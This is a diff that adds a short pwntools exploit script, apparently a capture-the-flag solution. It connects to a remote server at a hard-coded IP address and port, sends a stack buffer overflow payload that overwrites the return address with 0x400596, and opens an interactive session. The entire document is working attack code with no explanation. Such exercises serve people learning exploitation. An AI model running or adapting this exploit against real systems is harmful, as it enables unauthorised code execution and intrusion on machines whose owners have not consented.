@@ -1,0 +1,7 @@
+from pwn import *
+sh=remote('111.198.29.45','47685')
+payload='A'*128+'B'*8+p64(0x00400596)
+sh.recvline()
+sh.sendline(payload)
+sh.interactive()
+
